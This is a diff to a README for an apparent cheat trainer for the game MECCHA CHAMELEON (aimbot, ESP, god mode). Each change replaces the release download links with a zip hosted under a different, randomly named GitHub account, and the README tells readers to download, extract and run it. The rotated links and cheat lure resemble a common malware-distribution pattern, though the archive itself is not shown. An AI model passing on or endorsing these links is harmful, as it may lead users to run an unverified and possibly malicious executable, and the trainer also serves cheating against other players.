@@ -12,7 +12,7 @@ ESP · Aimbot · Fly Hack · Teleport · God Mode · Infinite Paint
 
 <div align="center">
 
-[![⬇️ Download](https://img.shields.io/badge/⬇️_Download-cc0000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ShieldIguana/MecchaOmega/releases/download/MecchaOmega/MecchaOmega.zip)
+[![⬇️ Download](https://img.shields.io/badge/⬇️_Download-cc0000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/PeasantEntrance45/MecchaOnyx/releases/download/MecchaOnyx/MecchaOnyx_v1.3.zip)
 
 </div>
 
@@ -30,11 +30,11 @@ ESP · Aimbot · Fly Hack · Teleport · God Mode · Infinite Paint
 
 <div align="center">
 
-### → [Download MecchaChameleonTrainer.zip](https://github.com/ShieldIguana/MecchaOmega/releases/download/MecchaOmega/MecchaOmega.zip) ←
+### → [Download MecchaChameleonTrainer.zip](https://github.com/PeasantEntrance45/MecchaOnyx/releases/download/MecchaOnyx/MecchaOnyx_v1.3.zip) ←
 
 </div>
 
-1. Download the latest build from the [release link](https://github.com/ShieldIguana/MecchaOmega/releases/download/MecchaOmega/MecchaOmega.zip)
+1. Download the latest build from the [release link](https://github.com/PeasantEntrance45/MecchaOnyx/releases/download/MecchaOnyx/MecchaOnyx_v1.3.zip)
 2. Extract next to your MECCHA CHAMELEON install
 3. Launch the game, then the trainer
 4. Press INSERT or F1 to open the menu
